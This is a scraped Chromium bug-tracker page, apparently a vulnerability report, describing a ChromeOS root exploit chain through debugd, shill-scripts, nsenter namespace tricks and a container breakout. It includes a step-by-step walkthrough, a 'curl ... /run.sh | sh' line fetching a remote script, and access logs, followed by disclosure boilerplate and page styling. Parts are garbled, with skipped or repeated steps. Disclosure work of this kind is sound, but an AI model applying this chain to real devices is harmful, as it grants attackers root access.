namespace. <span class="line"><!---->At this time the code is uid 0 with no capabilities, inside a user namespace and the debugd mount namespace. <!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/setup/arc_setup.cc#847<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/setup/arc_setup.cc#847"><!---->https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/setup/arc_setup.cc#847<!----></a><br>[2] <span class="line"><!---->[2] <!----></span>https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/setup/arc_setup.cc#830<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/setup/arc_setup.cc#830"><!---->https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/setup/arc_setup.cc#830<!----></a><br><br>=== arc-sensor container breakout ===<span class="line"><!---->=== arc-sensor container breakout ===<!----></span><br>Dbus SCM_CREDENTIALS user authentication validates claims against the process uid with respect to the init namespace. This means that the uid 0 code execution can perform dbus requests as real root.<span class="line"><!---->Dbus SCM_CREDENTIALS user authentication validates claims against the process uid with respect to the init namespace. This means that the uid 0 code execution can perform dbus requests as real root.<!----></span><br><br>This can be used to start an upstart service with an imported variable. In this case the arc-sensor upstart service is targeted, which imports the CONTAINER_PID variable against which it executes some commands using nsenter [1].<span class="line"><!---->This can be used to start an upstart service with an imported variable. In this case the arc-sensor upstart service is targeted, which imports the CONTAINER_PID variable against which it executes some commands using nsenter [1].<!----></span><br><br>A separate user and mount namespace is created by the shill-scripts code which creates symlinks at the relevant executable locations to a memfd in the bind mounted proc file system. When the upstart job is triggered the nsenter will enter the attacker controlled namespace and execute the attacker controlled code with full root privileges.<span class="line"><!---->A separate user and mount namespace is created by the shill-scripts code which creates symlinks at the relevant executable locations to a memfd in the bind mounted proc file system. When the upstart job is triggered the nsenter will enter the attacker controlled namespace and execute the attacker controlled code with full root privileges.<!----></span><br><br>This code will then use the bind mounted proc namespace to setns() back into the init mount and user namespaces, beep to indicate successful execution, and run sshd.<span class="line"><!---->This code will then use the bind mounted proc namespace to setns() back into the init mount and user namespaces, beep to indicate successful execution, and run sshd.<!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/setup/etc/arc-sensor.conf#81<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/setup/etc/arc-sensor.conf#81"><!---->https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/setup/etc/arc-sensor.conf#81<!----></a><br><br>EXPLOITATION WALKTHROUGH<span class="line"><!---->EXPLOITATION WALKTHROUGH<!----></span><br>run.sh<span class="line"><!---->run.sh<!----></span><br>1. Stage sshd config and keys for later<span class="line"><!---->1. Stage sshd config and keys for later<!----></span><br>2. Repeatedly call CrosDisks.Mount with the bind option and sshfs:///run as the path. Simultaneously, attempt to cd into the directory as named by mountlabel. On success, return, as the mount will now persist.<span class="line"><!---->2. Repeatedly call CrosDisks.Mount with the bind option and sshfs:///run as the path. Simultaneously, attempt to cd into the directory as named by mountlabel. On success, return, as the mount will now persist.<!----></span><br>3. Start the termina VM<span class="line"><!---->3. Start the termina VM<!----></span><br>4. Share the PlayFiles path with termina<span class="line"><!---->4. Share the PlayFiles path with termina<!----></span><br>5. Inside termina, curl the obb file from the configured staging server into /mnt/chromeos/PlayFiles/Music<!----></span><br>6. Mount the downloaded obb file, now under /data/media/0/Music/exploit.obb, with a gid offset of -654360<span class="line"><!---->6. Mount the downloaded obb file, now under /data/media/0/Music/exploit.obb, with a gid offset of -654360<!----></span><br>7. This code can potentially be called 4 times (due to the network_diag exploit), so implement a lockfile to ensure it only exploits once<span class="line"><!---->8. This code can potentially be called 4 times (due to the network_diag exploit), so implement a lockfile to ensure it only exploits once<!----></span><br>9. Create a memfd containing the contents of the .so file<span class="line"><!---->9. Create a memfd containing the contents of the .so file<!----></span><br>10. Shelling out to dbus-send, exploit the network_diag script via debugd.RunShillScriptStart. Pass in the memfd from 9 as the 'output' file descriptor.<span class="line"><!---->10. Shelling out to dbus-send, exploit the network_diag script via debugd.RunShillScriptStart. Pass in the memfd from 9 as the 'output' file descriptor.<!----></span><br>11. Shill-scripts will LD_PRELOAD dbus.so via the passed memfd with /proc/self/fd/2 to execute the same .so file.<span class="line"><!---->11. Shill-scripts will LD_PRELOAD dbus.so via the passed memfd with /proc/self/fd/2 to execute the same .so file.<!----></span><br>12. As shill-scripts, create a unix socket server in /dev/shm, which is shared between the debugd mount namespace and the init mount namespace. (shill-scripts execution continues below)<span class="line"><!---->12. As shill-scripts, create a unix socket server in /dev/shm, which is shared between the debugd mount namespace and the init mount namespace. (shill-scripts execution continues below)<!----></span><br>13. As chronos (resuming from step 10), connect to the unix socket server. Open and pre-authenticate a dbus socket, create memfd descriptors containing the p9 go binary and the 'final' binary, also open an O_DIRECTORY file descriptor to the init namespace /tmp directory. Pass all four file descriptors to shill-scripts, along with a pipe for signalling.<span class="line"><!---->13. As chronos (resuming from step 10), connect to the unix socket server. Open and pre-authenticate a dbus socket, create memfd descriptors containing the p9 go binary and the 'final' binary, also open an O_DIRECTORY file descriptor to the init namespace /tmp directory. Pass all four file descriptors to shill-scripts, along with a pipe for signalling.<!----></span><br>14. Move /home/chronos/Default out of the way and create a symbolic link pointing to /run in the same location.<span class="line"><!---->14. Move /home/chronos/Default out of the way and create a symbolic link pointing to /run in the same location.<!----></span><br>15. Create a symbolic link in /run/chrome pointing to /tmp/piddir/uid_map, used later<span class="line"><!---->15. Create a symbolic link in /run/chrome pointing to /tmp/piddir/uid_map, used later<!----></span><br>16. Make a world writable fifo in /tmp<span class="line"><!---->16. Make a world writable fifo in /tmp<!----></span><br>17. Using the pipe from 13, signal to shill-scripts that it can continue execution.<span class="line"><!---->17. Using the pipe from 13, signal to shill-scripts that it can continue execution.<!----></span><br><br>dbus.c<span class="line"><!---->dbus.c<!----></span><br>asshillscripts_stage2 (executing as shill-scripts)<span class="line"><!---->asshillscripts_stage2 (executing as shill-scripts)<!----></span><br>18. Start vm_concierge via debugd.StartVmConcierge<span class="line"><!---->19. Start vm_concierge via debugd.StartVmConcierge<!----></span><br>20. Create a bound unix socket at a known location, and pass it to Seneschal.StartServer<!----></span><br>21. Share the /media/fuse/crostini_XXX_termina_penguin directory as the LinuxFiles storage of the XXX user, via the Seneschal.SharePath dbus call. (this shares /run via the bind mount indirection)<span class="line"><!---->21. Share the /media/fuse/crostini_XXX_termina_penguin directory as the LinuxFiles storage of the XXX user, via the Seneschal.SharePath dbus call. (this shares /run via the bind mount indirection)<!----></span><br>22. Execute the p9 Go memfd as shared by chronos.<span class="line"><!---->22. Execute the p9 Go memfd as shared by chronos.<!----></span><br><br>p9.go<span class="line"><!---->p9.go<!----></span><br>"first"<span class="line"><!---->"first"<!----></span><br>23. Using the unix socket created in 20, connect to the running Seneschal 9s server with the 9p protocol<!----></span><br>24. Enter a new user namespace<!----></span><br>28. Recreate the directory structure /run/arc/oem/etc<!----></span><br>33. Rename the symlink created in 15 to /run/arc/oem/etc/media_profiles.xml.         It shouldn't matter. If you're not seeing a second log line requesting exploit.obb on your http server (assuming run.sh has been updated to reflect your IP address), this indicates that termina or penguin aren't launching properly.<span class="line"><!---->It shouldn't matter. If you're not seeing a second log line requesting exploit.obb on your http server (assuming run.sh has been updated to reflect your IP address), this indicates that termina or penguin aren't launching properly.<!----></span><br><br>After the shell script exits with a failure, can you vsh into pengiun? You should be able to copy/paste the vm_shell function in run.sh to validate.<span class="line"><!---->After the shell script exits with a failure, can you vsh into pengiun?         Just for completeness, these are the exact steps I'm performing on a freshly powerwashed machine, validated just now:<span class="line"><!---->Just for completeness, these are the exact steps I'm performing on a freshly powerwashed machine, validated just now:<!----></span><br><br>Setup/Log in to my account<span class="line"><!---->Setup/Log in to my account<!----></span><br>Search key "Terminal", Next, Install, wait for the terminal to open<span class="line"><!---->Search key "Terminal", Next, Install, wait for the terminal to open<!----></span><br>Press the physical power button, Power Off<span class="line"><!---->Press the physical power button, Power Off<!----></span><br>Press the physical power button again to boot<span class="line"><!---->Press the physical power button again to boot<!----></span><br>Log in to my account<span class="line"><!---->Log in to my account<!----></span><br>Ctrl+alt+t to open crosh, "shell", "curl 172.16.2.72:8000/run.sh | sh"<span class="line"><!---->Ctrl+alt+t to open crosh, "shell", "curl 172.16.2.72:8000/run.sh | sh"<!----></span><br>Wait for clicks<span class="line"><!---->Wait for clicks<!----></span><br>Log in again<span class="line"><!---->Log in again<!----></span><br>Ctrl+alt+t, "shell", "ssh -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1"<span class="line"><!---->Ctrl+alt+t, "shell", "ssh -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1"<!----></span><br><br>I see two requests to my http server for the relevant files:<span class="line"><!---->I see two requests to my http server for the relevant files:<!----></span><br>172.16.3.76 - - [30/Sep/2020 21:24:22] "GET /run.sh HTTP/1.1" 200 -<span class="line"><!---->172.16.3.76 - - [30/Sep/2020 21:24:22] "GET /run.sh HTTP/1.1" 200 -<!----></span><br>172.16.3.76 - - [30/Sep/2020 21:24:44] "GET /exploit.obb HTTP/1.1" 200 -<span class="line"><!---->172.16.3.76 - - [30/Sep/2020 21:24:44] "GET /exploit.obb HTTP/1.1" 200 -<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;

          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>
    <!----></mr-autocomplete>
            </div>
          </div>

          

          
            
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

       Note: Avoiding 2-way data binding to futureproof this code
        for LitElement.

      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>

    <mr-app loginurl="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fuc.appengine.google.com%2F_ah%2Fconflogin%3Fcontinue%3Dhttps%253A%252F%252Fbugs.chromium.org%252Fp%252Fchromium%252Fissues%252Fdetail%253Fid%253D1132954%2526q%253Dlabel%25253Aexternal_security_report%2526can%253D1%2526start%253D5400" logouturl="https://bugs.chromium.org/_ah/logout?continue=https://accounts.google.com/Logout%3Fcontinue%3Dhttps://uc.appengine.google.com/_ah/logout%253Fcontinue%253Dhttps://www.google.com/url%25253Fsa%25253DD%252526q%25253Dhttps://bugs.chromium.org/p/chromium/issues/detail%2525253Fid%2525253D1132954%25252526q%2525253Dlabel%252525253Aexternal_security_report%25252526can%2525253D1%25252526start%2525253D5400%252526ust%25253D1703414642886191%252526usg%25253DAOvVaw0ociYVvryJECAtnwli1_Ej%26service%3Dah" versionbase="https://61906-5c6a57f-dot-monorail-prod.appspot.com" projectalert=""><!---->
      <style>
        
  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }
      </style>

          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;

            width: 100%;

            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }

      </style>

          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>
      <mr-click-throughs></mr-click-throughs>
      
        <div class="container-outside" id="issue">
          <aside class="metadata-container">
            <mr-issue-metadata></mr-issue-metadata>
          </aside>

              <mr-issue-details class="main-item"><!---->

      </style>
      <mr-description></mr-description>

 function _go(url, newWindow) {
 if (newWindow)
 window.open(url, '_blank');
 else
 document.location = url;
 }
 function $(id) { return document.getElementById(id); }
 var loadQueue = [];
 function runOnLoad(fn) { loadQueue.push(fn); }
 window.onload = function() {
 for (var i = 0; i < loadQueue.length; i++)
 loadQueue[i]();
 delete loadQueue;
 };
<script type="text/javascript" nonce="">
 function _go(url, newWindow) {
 if (newWindow)
 window.open(url, '_blank');
 else
 document.location = url;
 }
 function $(id) { return document.getElementById(id); }
 var loadQueue = [];
 function runOnLoad(fn) { loadQueue.push(fn); }
 window.onload = function() {
 for (var i = 0; i < loadQueue.length; i++)
 loadQueue[i]();
 delete loadQueue;
 };
</script>

    --mr-edit-field-padding: 0.125em 4px;

  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }

                star the current issue<span class="key-tip"><!---->star the current issue<!----></span>
              
                
                  
                    ?<kbd><!---->?<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->?<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                show this help dialog<span class="key-tip"><!---->show this help dialog<!----></span>
              
            <div class="keyboard-help-section">
              <span></span><span class="help-title"><!---->Anywhere<!----></span>

                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->/<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                <span class="key-tip"><!---->focus on the issue search field<!----></span>
              <!---->
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->c<!----></kbd>

                  <!---->
